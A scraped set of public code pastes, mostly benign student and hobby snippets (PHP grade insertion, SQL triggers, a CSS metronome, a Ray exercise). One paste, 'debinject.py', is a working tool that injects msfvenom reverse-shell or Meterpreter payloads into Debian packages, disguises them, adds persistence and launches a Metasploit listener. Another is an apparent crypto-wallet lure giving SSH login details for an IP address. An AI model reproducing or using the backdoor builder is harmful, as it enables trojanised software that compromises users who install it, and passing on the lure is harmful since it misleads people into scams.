id,title,username,language,date,content
q3ZL9q5a,Untitled,sarjsarj,PHP,Thursday 9th of November 2023 11:55:22 PM CDT,"if (isset($_POST['save_grades'])) {
    // Check if the button with name 'save_grades' was clicked

    foreach ($_POST['gradeInput'] as $studentKey => $grade) {
        // Split the $studentKey to get section and student numbers
        list($section, $student) = explode('_', $studentKey);

        // Construct studentName based on the section and student number
        $studentName = ""SEC"" . $section . ""_STUD"" . $student;

        // Use prepared statements to insert data into the ""midtermexam2"" table
        $insertQuery = ""INSERT INTO midtermexam2 (studentName, subject, section, grade) VALUES (?, ?, ?, ?)"";
        $stmt = $conn->prepare($insertQuery);
        $stmt->bind_param(""sssd"", $studentName, $subject, $section, $grade);

        // Execute the insert query
        if ($stmt->execute()) {
            // Data inserted successfully
            echo ""Grade for Section $section, Student $student inserted successfully.<br>"";
        } else {
            // Handle error if the insertion fails
            echo ""Error inserting grade for Section $section, Student $student: "" . $conn->error . ""<br>"";
        }
    }
}"
Gym6ve8W,Raspberry PI 4 Over Clock Settings,rehannali,autoconf,Thursday 9th of November 2023 11:53:15 PM CDT,"[all]
force_turbo=1
arm_freq=2147
arm_freq_min=100
gpu_freq=750
gpu_freq_min=100
over_voltage=8
over_voltage_min=-16
hdmi_group=2
hdmi_mode=82
hdmi_force_hotplug=1"
PZq31hk2,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Thursday 9th of November 2023 11:52:46 PM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be: 
josli45:KoE3dG1 on 159.223.212.34
You can connect via SSH.

Regards
BT750419"
ZtSLbSeV,rolling square metronome,Mangus875,HTML,Thursday 9th of November 2023 11:38:45 PM CDT,"<!DOCTYPE html>
<html>
	<head>
		<title>Animated Metronome</title>
		<style>
			:root {
			background-color: #2d2d2d;
			}
			.rolling_square {
			--bpm: 120;
			--duration: calc(240s / var(--bpm));
			position: absolute;
			left: 50%;
			top: 50%;
			width: 50vh;
			height: 50vh;
			background-color: #fff;
			transform: translate(-50%, -50%);
			}
			.rolling_square div {
			position: absolute;
			width: 50%;
			height: 50%;
			background-color: #ff5533;
			animation: roll var(--duration) ease-in infinite;
			animation-play-state:
			}
			@keyframes roll {
			0% {
			transform-origin: top right;
			transform: translate(0%, 0%);
			}
			25% {
			transform-origin: top right;
			transform: rotate(-90deg);
			}
			25.000001% {
			transform-origin: bottom right;
			transform: translate(100%, 0) rotate(0deg);
			}
			50% {
			transform-origin: bottom right;
			transform: translate(100%, 0%) rotate(-90deg);
			}
			50.000001% {
			transform-origin: bottom left;
			transform: translate(100%, 100%) rotate(0deg);
			}
			75% {
			transform-origin: bottom left;
			transform: translate(100%, 100%) rotate(-90deg);
			}
			75.000001% {
			transform-origin: top left;
			transform: translate(0%, 100%) rotate(0deg);
			}
			100% {
			transform-origin: top left;
			transform: translate(0%, 100%) rotate(-90deg);
			}
			}
			.slidecontainer {
			position: absolute;
			left: 50%;
			top: 24%;
			transform: translate(-50%, -50%);
			width: 45vh;
			display: flex;
			flex-direction: row;
			}
			.slidecontainer::before {
			transform: translateY(-60%);
			font-family: consolas;
			font-size: 20px;
			color: #fff;
			content: attr(data-bpm) "" BPM"";
			}
			.slider {
			-webkit-appearance: none;
			width: 100%;
			height: 10px;
			border-radius: 5px;
			background: #ddd;
			outline: none;
			}
			.slider::-webkit-slider-thumb {
			-webkit-appearance: none;
			appearance: none;
			width: 15px;
			height: 15px;
			border-radius: 50%;
			background: #ff5533;
			cursor: pointer;
			}
		</style>
		<script>
			var bpmSlider,met;
			
			window.onload = () => {
				bpmSlider = document.getElementById(""bpm-slider"");
				met = document.querySelector("".rolling_square div"");
				
				setInterval(() => {
					let bpm = bpmSlider.value;
					met.style.setProperty('--duration', `calc(240s / ${bpm})`);
					document.querySelector("".slidecontainer"").setAttribute(""data-bpm"", bpm);
				});
				
				document.querySelector("".rolling_square"").onclick = () => {
					let playing = getComputedStyle(met).getPropertyValue(""animation-play-state"") == ""running"";
					if (playing) {
						met.style.setProperty(""animation-play-state"", ""paused"");
						met.style.setProperty(""animation"", ""none"");
						setTimeout(() => {
							met.style.setProperty(""animation"", ""roll var(--duration) ease-in infinite"");
							met.style.setProperty(""animation-play-state"", ""paused"");
						});
						return;
					}
					met.style.setProperty(""animation-play-state"", ""running"");
				}
			}
		</script>
	</head>
	<body>
		<div class='slidecontainer' data-bpm='120'>
			<input type='range' min='10' max='360' value='120' class='slider' id='bpm-slider'>
		</div>
		<div id='metronome' class='rolling_square'>
			<div id='ticker'></div>
		</div>
	</body>
</html>"
auZkTX0B,debinject.py,FlyFar,Python,Thursday 9th of November 2023 10:28:21 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#-------------------------------
#
#      BY: UNDEADSEC from BRAZIL :)
#      Visit: https://www.youtube.com/c/UndeadSec
#      Github: https://github.com/UndeadSec/EvilURL
#      Telegram: https://t.me/UndeadSec
#
#-------------------------------
BLUE, RED, WHITE, YELLOW, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;32m', '\033[0m'
#-------------------------------
from subprocess import call
#-------------------------------
def message():
    call('clear', shell=True)
    print """"""

 --------------------{1}
┌┬┐┌─┐┌┐ ┬┌┐┌ ┬┌─┐┌─┐┌┬┐   
 ││├┤ ├┴┐││││ │├┤ │   │ BY: {1}Undead{2}Sec{1} from BRazil {0}
─┴┘└─┘└─┘┴┘└┘└┘└─┘└─┘ ┴ 
{0} --------------------{1}

"""""".format(GREEN, END, RED, YELLOW, GREEN)
#-------------------------------
def main():
    call('rm -Rf output', shell=True)
    call(""rm -Rf /tmp/evil"", shell=True)
    print '~ / Inject malicious codes into *.deb\'s\n '
    print ""{0}[-] Insert *.deb file path: {1}"".format(YELLOW, END)
    file_path = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    print ""\n{0}[-] Insert LHOST: {1}"".format(YELLOW, END)
    LHOST = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    print ""\n{0}[-] Insert LPORT: {1}"".format(YELLOW, END)
    LPORT = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    call('mkdir /tmp/evil', shell=True)
    call('cp ' + file_path + ' /tmp/evil/original.deb', shell=True)
    call('dpkg -x /tmp/evil/original.deb /tmp/evil/work', shell=True)
    call('mkdir /tmp/evil/work/DEBIAN', shell=True)
#-------------------------------
def setArch():
    print '\nInsert the target arch x86 or x64: '
    arch = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    if arch == 'x64':
        call('cp Utils/x64/control /tmp/evil/work/DEBIAN')
        call('cp Utils/x64/postinst /tmp/evil/work/DEBIAN')
    elif arch == 'x86':
        call('cp Utils/x86/control /tmp/evil/work/DEBIAN')
        call('cp Utils/x86/postinst /tmp/evil/work/DEBIAN')
    else:
        print ""\nChoose [x64] or [x86]""
#-------------------------------
def setPayload():
    print ""\n - CHOOSE THE PAYLOAD -  \n[1] metasploit/linux/<arch>/shell/reverse_tcp\n[2] metasploit/linux/<arch>/meterpreter/reverse_tcp\n[3] metasploit/linux/<arch>/meterpreter/bind_tcp\n[4] metasploit/linux/<arch>/shell/bind_tcp""
    option = raw_input(""\n{0}debinject{1} > "".format(GREEN, END))
    if option == '1':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/shell/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    elif option == '2':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    elif option == '3':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/meterpreter/bind_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    elif option == '4':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/shell/bind_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    else:
        print ""\nInvalid""
        call('exit', shell=True)
#-------------------------------
def setPersistence():
    persistence = raw_input('\nDo you want to enable persistence?(y/n) : ')
    if persistence.upper() == 'Y':
        call('cp Utils/Persistence/kernellog /tmp/evil/work/usr/games/', shell=True)
#-------------------------------
def makeEvil():
    call('chmod 755 /tmp/evil/work/DEBIAN/postinst', shell=True)
    call('cd /tmp/evil/work/DEBIAN && dpkg-deb --build /tmp/evil/work', shell=True)
    call('rm -Rf output/ && mkdir output', shell=True)
    call('mv /tmp/evil/work.deb output/backdoored.deb && chmod 755 output/backdoored.deb', shell=True)
    print ""\n The .deb backdoored saved to: /output/backdoored.deb\n""
    listen = raw_input(""Do you want to start listener? (y/n): "")
    if option != '3' and option != '4':
        if listen.upper() == ""Y"":
            if option == '1':
	        call('service postgresql start', shell=True)
                call('msfconsole -q -x ""use exploit/multi/handler;set PAYLOAD linux/' + arch + '/shell/reverse_tcp; set LHOST ' + LHOST + '; set LPORT ' + LPORT + '; run; exit -y""', shell=True)
	    elif option == '2':
	        call('service postgresql start')
                call('msfconsole -q -x ""use exploit/multi/handler;set PAYLOAD linux/' + arch + '/meterpreter/reverse_tcp; set LHOST ' + LHOST + '; set LPORT ' + LPORT + '; run; exit -y""', shell=True)
        else:
            print ""Bye :D""
    else:
        print ""\nStart Metasploit listener and Happy Hacking""
#-------------------------------
if __name__ == '__main__':
    message()
    main()
    setArch()
    setPayload()
    setPersistence()
    makeEvil()"
EiD37dKk,validator class,cirossmonteiro,Python,Thursday 9th of November 2023 10:20:05 PM CDT,"class Validator:
    def __call__(self, value):
        return self.validate(value)

class MinValidator(Validator):
    def __init__(self, minimum):
        self.minimum = minimum
        
    def validate(self, value):
        return value >= self.minimum

class MaxValidator(Validator):
    def __init__(self, maximum):
        self.maximum = maximum
        
    def validate(self, value):
        return value <= self.maximum

# big version
##class BetweenValidator(MinValidator, MaxValidator):
##    def __init__(self, minimum, maximum):
##        MinValidator.__init__(self, minimum)
##        MaxValidator.__init__(self, maximum)
##        
##    def validate(self, value):
##        return MinValidator.validate(self, value) and MaxValidator.validate(self, value)

class MergeValidators(Validator):
    validator_classes = []
    
    def __init__(self, *args):
        for index, vclass in enumerate(self.validator_classes):
            if type(args[index]) == list:
                vclass.__init__(self, *args[index])
            else:
                vclass.__init__(self, args[index])

    def validate(self, value):
        for index, vclass in enumerate(self.validator_classes):
            if not vclass.validate(self, value):
                return False

        return True
        
# small version
class BetweenValidator(MergeValidators):
    validator_classes = [
        MinValidator,
        MaxValidator
    ]

assert BetweenValidator(18, 25)(18) 
# same as ""MinValidator(18)(18) and MaxValidator(25)(18)"""
dYmDM8kx,glamiau,Arconteus,SQL,Thursday 9th of November 2023 09:34:21 PM CDT,"/*
Crear un trigger que dada una tabla llamada:
Inventario con atributos 
id_car, 
modelo_car, 
marca_car, 
anio_car, 
precio_car

al momento de asignar nuevas unidades al inventario decida a cuál de las tres agencias (Norte, Oriente y Sur) se asigna la unidad. 

La tabla afectada por el trigger se llama 
Mov_Inventario y consta de los siguientes atributos: 
id_reg, 
id_car (dato de la tabla inventario), 
marca, 
modelo, 
fecha_reg, 
usuario_reg y 
movimiento (por el momento solo registre stock). 

La acción disparadora será por tanto un insert.
*/
/*
========================================================
CREAR BASE DE DATOS
========================================================
*/
CREATE DATABASE Practica ON(
    name = Practica_dat,
    filename = 'C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\Practica.mdf',
    SIZE = 10MB,
    maxsize = 30MB,
    filegrowth = 5MB
)
log ON(
    name = Practica_log,
    filename = 'C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\DATA\Practica.ldf',
    SIZE = 5MB,
    maxsize = 30MB,
    filegrowth = 5MB
);
USE Practica
GO
/*
========================================================
CREAR TABLAS
========================================================
*/
CREATE TABLE inventario(
	id_car SMALLINT PRIMARY KEY, 
	modelo_car VARCHAR(50) NOT NULL, 
	marca_car VARCHAR(30) NOT NULL, 
	anio_car SMALLINT NOT NULL, 
	precio_car DECIMAL(10,2)
);
CREATE TABLE Mov_Inventario (
    id_reg INT PRIMARY KEY,
    id_car SMALLINT not null,
    marca VARCHAR(30) not null,
    modelo VARCHAR(50) not null,
    fecha_reg DATE not null,
    usuario_reg VARCHAR(255) not null,
    movimiento VARCHAR(255) not null,
	CONSTRAINT ""FK_ID_CAR"" FOREIGN KEY(id_car)
	REFERENCES inventario(id_car)
);
/*
========================================================
TRIGGER
========================================================
*/
CREATE TRIGGER tg_registro
ON inventario AFTER INSERT AS
BEGIN SET NOCOUNT ON;
	-- AGENCIA
	DECLARE @agencia varchar(7);
	UPDATE Mov_Inventario
    SET @agencia = 
        CASE 
            WHEN i.anio_car >= 2023 THEN 'Norte'
            WHEN i.anio_car >= 2015 AND i.anio_car < 2022 THEN 'Sur'
            ELSE 'Oriente'
        END
    FROM Mov_Inventario m, Inventario i, inserted ins
	WHERE m.id_car = i.id_car 
	AND	i.id_car = ins.id_car;
    SELECT CONCAT('La agencia: ', @agencia,' se encargara de este modelo.') AS Mensaje;
	-- INSERT INTO
	INSERT INTO Mov_Inventario (id_car, marca, modelo, fecha_reg, usuario_reg, movimiento)
    SELECT i.id_car, i.marca_car, i.modelo_car, GETDATE(), SYSTEM_USER, 'stock'
    FROM Inventario i, inserted ins 
	WHERE i.id_car = ins.id_car; 
END;
"
mfPFket7,ProveedoresVisita,orezalucard,C#,Thursday 9th of November 2023 09:08:57 PM CDT,"SELECT ROW_NUMBER() OVER(PARTITION BY P.Pro_Codigo ORDER BY P.Pro_Codigo) AS Number, P.Pro_Codigo, CONCAT(P.Pro_Nombre,' ', P.Pro_ApellidoPaterno,' ',P.Pro_ApellidoMaterno) AS NombreProveedor, PD.Pro_DiaVisita,
NE.NE_Fecha,
CONCAT(NE.FolTda_Codigo,'-',NE.FolEst_Codigo,'-',NE.FolDoc_Codigo,'-',NE.FolConsecutivo) AS Folio, NE.FolTda_Codigo,NE.FolEst_Codigo,NE.FolDoc_Codigo,NE.FolConsecutivo,
ROW_NUMBER() OVER (PARTITION BY NE.Pro_Codigo, CAST(NE.NE_Fecha AS DATE) ORDER BY NE.Pro_Codigo, CAST(NE.NE_Fecha AS DATE)) AS FilaDocumento
FROM Proveedores P
INNER JOIN ProveedoresDeta PD ON P.Pro_Codigo = PD.Pro_Codigo
LEFT JOIN NotasEntrada NE ON NE.Pro_Codigo = P.Pro_Codigo AND NE.TMA_Codigo = 1
WHERE NE.NE_Fecha BETWEEN @DesdeFecha AND @HastaFecha  AND P.Pro_Codigo BETWEEN @ProveedorInicio AND @ProveedorFinal"
py3tSh17,remove popup ads on tradingview as soon as they pop onto screen.,Build,JavaScript,Thursday 9th of November 2023 08:08:48 PM CDT,"// Callback function to handle mutations
const handleMutations = (mutationsList) => {
	for (const mutation of mutationsList) {
		if (mutation.type === ""childList"") {
			// Check if the ads element is added or removed
			const overlapManager = document.querySelector(
				""#overlap-manager-root > div:nth-child(2)""
			);
			const goPro = document.querySelector(
				""#overlap-manager-root > div:nth-child(2) > div""
			);
			const span = document.querySelector(
				""#overlap-manager-root > div:nth-child(4) > div""
			);

			if (overlapManager) {
				if (goPro) {
					console.log(""Ads found!"");
					goPro.remove();
					console.log(""Ads removed :)"");
				}
				if (span) {
					console.log(""Ads found!"");
					span.remove();
					console.log(""Ads removed :)"");
				}
			}
		}
	}
};

// Options for the MutationObserver (configuring what to observe)
const observerConfig = { childList: true, subtree: true };

// Create a MutationObserver with the callback and options
const observer = new MutationObserver(handleMutations);

// Start observing the target node (body) with the specified options
observer.observe(document.body, observerConfig);

// To stop observing (optional)
// observer.disconnect();
"
Q9zdTsZP,ExamenP1 Distributed Computing,MateoCabrera,Python,Thursday 9th of November 2023 07:49:18 PM CDT,"import csv
import ray
import time

# Función que calcula la suma de cubos de una lista de números
def suma_cubos(numbers):
    sum = 0
    for num in numbers:
        sum += num**3
    return sum

# Función para ejecutar de manera local
def run_local(file_path):
    #vamos a usar dos arreglos uno para ir almacenando la informacion y otro para recorrer una parte dle archivo
    numbers = []
    datos = []
    # abrivos el archivo que se encuentra en file_path
    with open(file_path, newline='') as archivo_csv:
        #creamos un lector de los elementos segun la orientacion en la documentacion de la libreria CSV
        lector_csv = csv.DictReader(archivo_csv)
        #iteramos cada fila ya que en el archivo por cada datos que vamos a importar
        for fila in lector_csv:
            #hacemos apencides en el arreglo para añadir los numeros
            datos.append(fila)
            numero = int(fila['numero'])
            numbers.append(numero)
            #los incertamos al arreglo de numbers
    #calculamos la sumas de los cubos de los numeros y tomamos el tiempo de ejecucion
    start_time = time.time() #esto es una funcion de python para tomar el tiempo
    resultado = suma_cubos(numbers)
    duration = time.time() - start_time
    print('Local execution time: {}'.format(duration))
    print('Resultado de la suma local es: ', resultado)
    #imprimimos los resultados de la medicion del timepo
    return datos, resultado

# Función para ejecutar de manera remota con Ray
@ray.remote #usamos este decorador para declarar nuestro tipo de ejecucion
def suma_cubos_distributed(numbers):
    return suma_cubos(numbers) #mandamos que funcion va a ejecutar remotamente

# Función que utiliza Ray para calcular la suma de cubos distribuida desde un archivo CSV
@ray.remote
def run_remota(file_path):
    # vamos a usar dos arreglos uno para ir almacenando la informacion y otro para recorrer una parte dle archivo
    numbers = []
    datos = []
    with open(file_path, newline='') as archivo_csv:
        # creamos un lector de los elementos segun la orientacion en la documentacion de la libreria CSV
        lector_csv = csv.DictReader(archivo_csv)
        # iteramos cada fila ya que en el archivo por cada datos que vamos a importar
        for fila in lector_csv:
            # hacemos apencides en el arreglo para añadir los numeros
            datos.append(fila)
            numero = int(fila['numero'])
            numbers.append(numero)
    start_time = time.time()  # esto es una funcion de python para tomar el tiempo
    resultado = suma_cubos(numbers)
    duration = time.time() - start_time
    print('Local execution time: {}'.format(duration))
    print('Resultado de la suma remota es: ', resultado)
    # imprimimos los resultados de la medicion del timepo
    return datos, resultado


# Ejecutar pruebas desde un archivo CSV (ajusta la ruta según tu caso)
file_path1 = 'datos1.csv'
file_path2 = 'datos2.csv'
file_path3 = 'datos3.csv'


#descomentar estas lineas para la ejecucion
# ---------------Llamar a la función run_local---------------
# para el archivo datos 1
#datos_local, resultado_local = run_local(file_path1)
#print('Datos 1 del archivo CSV (local):', datos_local) #esta es una funcion que nos permite ver como se lelleron los datos des archivo

# para el archivo datos 2
#datos_local, resultado_local = run_local(file_path2)
#print('Datos 2 del archivo CSV (local):', datos_local)

# para el archivo datos 3
#datos_local, resultado_local = run_local(file_path3)
#print('Datos 3 del archivo CSV (local):', datos_local)

# ---------------Llamar a la función run_remota---------------
# para el archivo datos 1
#resultado_remoto = run_remota.remote(file_path1)"
